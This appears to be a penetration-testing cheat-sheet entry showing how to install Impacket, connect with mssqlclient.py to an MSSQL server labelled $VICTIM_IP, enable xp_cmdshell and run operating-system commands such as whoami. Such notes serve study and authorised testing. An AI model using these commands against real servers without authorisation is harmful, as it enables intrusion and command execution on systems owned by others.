
### <span style="color:#50FA7B">`mssqlclient`</span>

```bash
# Download
https://github.com/fortra/impacket/releases

# Setup
## If you need a Python environment
python3 -m venv venv
source venv/bin/activate
## package installing
pip install -r requirements.txt
python3 setup.py install 

# Connect
cd example
python3 mssqlclient.py -windows-auth sql_dev@$VICTIM_IP
Enter Password

# enable cmd shell
enable_xp_cmdshell
# run command 
xp_cmdshell whoami
```
###### <span style="color:#FFB86C">OR</span>

```bash
# install
python3 -m pipx install impacket

# verify
which mssqlclient.py

# run
mssqlclient.py -windows-auth sql_dev@$VICTIM_IP
Enter Password

# enable cmd shell
enable_xp_cmdshell
# run command 
xp_cmdshell whoami
```